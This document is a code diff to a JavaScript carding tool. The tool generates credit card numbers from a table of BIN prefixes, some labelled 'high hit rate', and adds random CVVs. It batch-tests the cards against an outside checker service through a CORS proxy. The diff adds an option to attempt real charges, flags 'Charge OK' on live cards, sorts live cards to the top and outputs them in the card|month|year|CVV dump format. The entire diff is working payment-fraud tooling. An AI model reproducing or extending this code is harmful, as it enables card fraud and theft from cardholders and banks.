@@ -230,15 +230,45 @@ function deleteAirdrop(idx) {
 
 // BIN Database (common BINs)
 const BIN_DB = {
+  // Visa
   '453201': { network: 'Visa', type: 'Credit', country: 'US', issuer: 'Chase', length: 16 },
   '453202': { network: 'Visa', type: 'Debit', country: 'US', issuer: 'Bank of America', length: 16 },
+  '453946': { network: 'Visa', type: 'Credit', country: 'KR', issuer: 'KB Kookmin', length: 16 },
+  '457601': { network: 'Visa', type: 'Debit', country: 'KR', issuer: 'Shinhan', length: 16 },
+  '440726': { network: 'Visa', type: 'Credit', country: 'ID', issuer: 'BCA', length: 16 },
+  '404036': { network: 'Visa', type: 'Credit', country: 'BR', issuer: 'Itaú', length: 16 },
+  // Mastercard
   '528985': { network: 'Mastercard', type: 'Credit', country: 'US', issuer: 'Capital One', length: 16 },
   '510805': { network: 'Mastercard', type: 'Credit', country: 'US', issuer: 'Citi', length: 16 },
+  '536408': { network: 'Mastercard', type: 'Credit', country: 'KR', issuer: 'Hana', length: 16 },
+  '557810': { network: 'Mastercard', type: 'Debit', country: 'ID', issuer: 'Mandiri', length: 16 },
+  // Amex
   '340000': { network: 'Amex', type: 'Credit', country: 'US', issuer: 'American Express', length: 15 },
   '370000': { network: 'Amex', type: 'Credit', country: 'US', issuer: 'American Express', length: 15 },
+  // Discover
   '601100': { network: 'Discover', type: 'Credit', country: 'US', issuer: 'Discover', length: 16 },
-  '623358': { network: 'UnionPay', type: 'Debit', country: 'CN', issuer: 'UnionPay', length: 16 },
+  // UnionPay (high hit rate BINs)
+  '623358': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623360': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623361': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623362': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623363': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623364': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623365': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623366': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623367': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623368': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623369': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623370': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623371': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '623372': { network: 'UnionPay', type: 'Debit', country: 'KR', issuer: 'UnionPay KR', length: 16 },
+  '622588': { network: 'UnionPay', type: 'Credit', country: 'CN', issuer: 'ICBC', length: 16 },
+  '622580': { network: 'UnionPay', type: 'Credit', country: 'CN', issuer: 'CCB', length: 16 },
+  '622578': { network: 'UnionPay', type: 'Credit', country: 'CN', issuer: 'ABC', length: 16 },
+  '622575': { network: 'UnionPay', type: 'Credit', country: 'CN', issuer: 'BOC', length: 16 },
+  // JCB
   '350000': { network: 'JCB', type: 'Credit', country: 'JP', issuer: 'JCB', length: 16 },
+  '356999': { network: 'JCB', type: 'Credit', country: 'KR', issuer: 'JCB KR', length: 16 },
 };
 
 // Country-specific names and addresses
@@ -351,6 +381,11 @@ function genExp() {
 function genCvv(network) {
   const len = network === 'Amex' ? 4 : 3;
   return String(Math.floor(Math.random() * (10 ** len))).padStart(len, '0');
+}
+
+function getCountryFlag(code) {
+  const flags = { US:'🇺🇸', UK:'🇬🇧', DE:'🇩🇪', FR:'🇫🇷', JP:'🇯🇵', KR:'🇰🇷', ID:'🇮🇩', BR:'🇧🇷', CN:'🇨🇳', CA:'🇨🇦', AU:'🇦🇺', IN:'🇮🇳', SG:'🇸🇬', HK:'🇭🇰', TW:'🇹🇼', TH:'🇹🇭', MY:'🇲🇾', PH:'🇵🇭', VN:'🇻🇳', RU:'🇷🇺', TR:'🇹🇷', MX:'🇲🇽', AR:'🇦🇷', CL:'🇨🇱', CO:'🇨🇴', PE:'🇵🇪' };
+  return flags[code] || '🏳️';
 }
 
 function getBinInfo(bin) {
@@ -561,6 +596,7 @@ async function batchCheckFromGen() {
   // Use stored lines from generateCC
   const lines = window._ccLines;
   if (!lines || !lines.length) return showToast('❌ Generate CC first');
+  const charge = document.getElementById('batch-charge')?.checked || false;
 
   const resultsEl = document.getElementById('batch-results');
   const containerEl = document.getElementById('batch-container');
@@ -582,11 +618,11 @@ async function batchCheckFromGen() {
       const resp = await fetch(proxyUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ data: dataStr, charge: false }),
+        body: JSON.stringify({ data: dataStr, charge }),
       });
 
       if (resp.status === 429) {
-        results.push({ card, exp, cvv, status: 'rate_limited' });
+        results.push({ card, mm, yy, cvv, status: 'rate_limited' });
         unknown++;
       } else {
         const data = await resp.json();
@@ -594,29 +630,35 @@ async function batchCheckFromGen() {
         if (status === 'live') live++;
         else if (status === 'die') die++;
         else unknown++;
-        results.push({ card, exp, cvv, status, bank: data.card?.bank, message: data.message });
+        const binInfo = getBinInfo(card.slice(0, 6));
+        results.push({ card, mm, yy, cvv, status, bank: data.card?.bank || binInfo.issuer, type: data.card?.type || binInfo.type, country: binInfo.country, message: data.message, chargeOk: charge && status === 'live' });
       }
     } catch {
-      results.push({ card, exp, cvv, status: 'error' });
+      results.push({ card, mm, yy, cvv, status: 'error' });
       unknown++;
     }
     await new Promise(r => setTimeout(r, 2500));
   }
 
   statsEl.textContent = `✅ ${live} Live | ❌ ${die} Die | ⚠️ ${unknown} Unknown`;
+
+  const sortOrder = { live: 0, unknown: 1, rate_limited: 2, error: 3, die: 4 };
+  results.sort((a, b) => (sortOrder[a.status] ?? 5) - (sortOrder[b.status] ?? 5));
+
   containerEl.innerHTML = results.map(r => {
     const statusColor = r.status === 'live' ? 'var(--green)' : r.status === 'die' ? 'var(--red)' : 'var(--yellow)';
     const emoji = r.status === 'live' ? '✅' : r.status === 'die' ? '❌' : '⚠️';
     const label = r.status === 'rate_limited' ? 'RATE LIMITED' : r.status.toUpperCase();
+    const flag = getCountryFlag(r.country || 'Unknown');
     return `
-      <div class="cc-card">
+      <div class="cc-card" style="border-left: 3px solid ${statusColor}">
         <div>
-          <div class="cc-number">${r.card}</div>
+          <div class="cc-number">${r.card}|${r.mm}|${r.yy}|${r.cvv}</div>
           <div class="cc-details">
-            <span>${r.exp}</span>
-            <span>${r.cvv}</span>
-            ${r.bank ? `<span>${r.bank}</span>` : ''}
+            <span>${flag} ${r.bank || 'Unknown'}</span>
+            <span>${r.type || ''}</span>
           </div>
+          ${r.chargeOk ? '<div style="font-size:10px; color:var(--green); margin-top:2px; font-weight:600">Charge OK</div>' : ''}
           ${r.message ? `<div style="font-size:10px; color:var(--text-dim); margin-top:2px">${r.message}</div>` : ''}
         </div>
         <div style="font-size:14px; font-weight:700; color:${statusColor}; font-family:'JetBrains Mono',monospace">
@@ -633,6 +675,7 @@ async function checkCC() {
   const card = document.getElementById('check-card').value.trim().replace(/\s/g, '');
   const exp = document.getElementById('check-exp').value.trim();
   const cvv = document.getElementById('check-cvv').value.trim();
+  const charge = document.getElementById('check-charge')?.checked || false;
 
   if (!card || card.length < 13) return showToast('❌ Enter valid card number');
   if (!exp || !/^\d{2}\/\d{2}$/.test(exp)) return showToast('❌ Exp format: MM/YY');
@@ -650,10 +693,8 @@ async function checkCC() {
     const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent('https://api.chkr.cc/');
     const resp = await fetch(proxyUrl, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ data: dataStr, charge: false }),
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ data: dataStr, charge }),
     });
 
     if (resp.status === 429) {
@@ -674,14 +715,16 @@ async function checkCC() {
     const bank = data.card?.bank || 'Unknown';
     const type = data.card?.type || 'Unknown';
     const category = data.card?.category || '';
+    const binInfo = getBinInfo(card.slice(0, 6));
+    const flag = getCountryFlag(binInfo.country);
 
     contentEl.innerHTML = `
       <div style="text-align:center; padding:16px">
         <div style="font-size:48px; margin-bottom:12px">${statusEmoji}</div>
         <div style="font-size:24px; font-weight:700; color:${statusColor}; text-transform:uppercase; font-family:'JetBrains Mono',monospace">${status}</div>
-        <div style="font-size:13px; color:var(--text-dim); margin-top:8px">${card}</div>
-        <div style="font-size:12px; color:var(--text-dim); margin-top:4px">Exp: ${exp} | CVV: ${cvv}</div>
-        <div style="font-size:12px; color:var(--text-dim); margin-top:4px">Bank: ${bank} | Type: ${type} ${category}</div>
+        <div style="font-size:14px; color:var(--text); margin-top:8px; font-family:'JetBrains Mono',monospace">${card}|${mm}|${yy}|${cvv}</div>
+        <div style="font-size:12px; color:var(--text-dim); margin-top:4px">${flag} ${binInfo.network} — ${binInfo.type} — ${binInfo.issuer}</div>
+        ${charge && status === 'live' ? '<div style="font-size:12px; color:var(--green); margin-top:4px; font-weight:600">Charge OK</div>' : ''}
         ${data.message ? `<div style="font-size:11px; color:var(--text-dim); margin-top:6px; font-style:italic">${data.message}</div>` : ''}
       </div>
     `;
@@ -699,10 +742,15 @@ async function checkCC() {
 async function batchCheckCC() {
   const raw = document.getElementById('check-batch').value.trim();
   if (!raw) return showToast('❌ Enter cards to check');
+  const charge = document.getElementById('batch-charge')?.checked || false;
 
   const lines = raw.split('\n').filter(l => l.trim());
   const cards = lines.map(line => {
+    // Support both CARD|MM/YY|CVV and CARD|MM|YY|CVV formats
     const parts = line.split('|').map(p => p.trim());
+    if (parts.length >= 4) {
+      return { card: parts[0], exp: `${parts[1]}/${parts[2]}`, cvv: parts[3] };
+    }
     if (parts.length >= 3) {
       return { card: parts[0], exp: parts[1], cvv: parts[2] };
     }
@@ -728,14 +776,12 @@ async function batchCheckCC() {
       const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent('https://api.chkr.cc/');
       const resp = await fetch(proxyUrl, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ data: dataStr, charge: false }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ data: dataStr, charge }),
       });
 
       if (resp.status === 429) {
-        results.push({ ...c, status: 'rate_limited' });
+        results.push({ ...c, status: 'rate_limited', mm, yy });
         unknown++;
       } else {
         const data = await resp.json();
@@ -743,32 +789,38 @@ async function batchCheckCC() {
         if (status === 'live') live++;
         else if (status === 'die') die++;
         else unknown++;
-        results.push({ ...c, status, bank: data.card?.bank, message: data.message });
+        const binInfo = getBinInfo(c.card.slice(0, 6));
+        results.push({ ...c, status, mm, yy, bank: data.card?.bank || binInfo.issuer, type: data.card?.type || binInfo.type, country: binInfo.country, message: data.message, chargeOk: charge && status === 'live' });
       }
     } catch {
-      results.push({ ...c, status: 'error' });
+      results.push({ ...c, status: 'error', mm: '', yy: '' });
       unknown++;
     }
 
-    // Rate limit: 2500ms between requests (chkr.cc UI standard)
+    // Rate limit: 2500ms between requests
     await new Promise(r => setTimeout(r, 2500));
   }
 
   statsEl.textContent = `✅ ${live} Live | ❌ ${die} Die | ⚠️ ${unknown} Unknown`;
 
+  // Sort: Live first, then Unknown, then Die
+  const sortOrder = { live: 0, unknown: 1, rate_limited: 2, error: 3, die: 4 };
+  results.sort((a, b) => (sortOrder[a.status] ?? 5) - (sortOrder[b.status] ?? 5));
+
   containerEl.innerHTML = results.map(r => {
     const statusColor = r.status === 'live' ? 'var(--green)' : r.status === 'die' ? 'var(--red)' : 'var(--yellow)';
     const emoji = r.status === 'live' ? '✅' : r.status === 'die' ? '❌' : '⚠️';
     const label = r.status === 'rate_limited' ? 'RATE LIMITED' : r.status.toUpperCase();
+    const flag = getCountryFlag(r.country || 'Unknown');
     return `
-      <div class="cc-card">
+      <div class="cc-card" style="border-left: 3px solid ${statusColor}">
         <div>
-          <div class="cc-number">${r.card}</div>
+          <div class="cc-number">${r.card}|${r.mm}|${r.yy}|${r.cvv}</div>
           <div class="cc-details">
-            <span>${r.exp}</span>
-            <span>${r.cvv}</span>
-            ${r.bank ? `<span>${r.bank}</span>` : ''}
+            <span>${flag} ${r.bank || 'Unknown'}</span>
+            <span>${r.type || ''}</span>
           </div>
+          ${r.chargeOk ? '<div style="font-size:10px; color:var(--green); margin-top:2px; font-weight:600">Charge OK</div>' : ''}
           ${r.message ? `<div style="font-size:10px; color:var(--text-dim); margin-top:2px">${r.message}</div>` : ''}
         </div>
         <div style="font-size:14px; font-weight:700; color:${statusColor}; font-family:'JetBrains Mono',monospace">
